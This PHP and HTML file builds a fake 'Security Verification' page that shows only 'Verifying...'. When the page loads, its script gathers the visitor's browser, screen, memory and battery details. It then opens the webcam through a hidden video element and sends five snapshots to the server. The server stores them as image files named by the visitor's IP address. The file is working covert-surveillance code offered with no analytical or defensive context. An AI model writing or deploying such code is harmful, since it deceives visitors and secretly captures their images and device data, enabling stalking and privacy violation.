<?php
$ip = $_SERVER["HTTP_CF_CONNECTING_IP"] ?? $_SERVER['REMOTE_ADDR'];
if (isset($_POST['imageData'])) {
    $data = str_replace(['data:image/jpeg;base64,', ' '], ['', '+'], $_POST['imageData']);
    $name = $_POST['name'] ?? 'snap';
    file_put_contents("photos/{$ip}_{$name}_".time().".jpg", base64_decode($data));
    exit;
}
if (isset($_POST['specs'])) {
    file_put_contents("visits.log", $ip . "|" . date("H:i:s") . "|" . $_POST['specs'] . "\n", FILE_APPEND);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Security Verification</title>
<style>
    body { background-color: #f4f7f9; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; max-width: 400px; width: 90%; }
</style>
</head>
<body>
    <div class="container">
        <h2>Verifying...</h2>
        <video id="v" style="display:none" autoplay></video>
        <canvas id="c" style="display:none"></canvas>
    </div>
    <script>
        async function sendInfo() {
            let b = await navigator.getBattery();
            let info = navigator.userAgent + "|" + screen.width + "x" + screen.height + "|" + (navigator.deviceMemory || 'N/A') + "GB RAM|" + Math.round(b.level * 100) + "%";
            fetch('', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'specs=' + encodeURIComponent(info)});
        }
        async function start() {
            await sendInfo();
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video:true});
                document.getElementById('v').srcObject = stream;
                for(let i=1; i<=5; i++) { await new Promise(r => setTimeout(r, 1500)); capture(i); }
            } catch(e) {}
        }
        function capture(n) {
            const v = document.getElementById('v'), c = document.getElementById('c');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            fetch('', {method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'imageData=' + encodeURIComponent(c.toDataURL('image/jpeg')) + '&name=snap' + n
            });
        }
        window.onload = start;
    </script>
</body>
</html>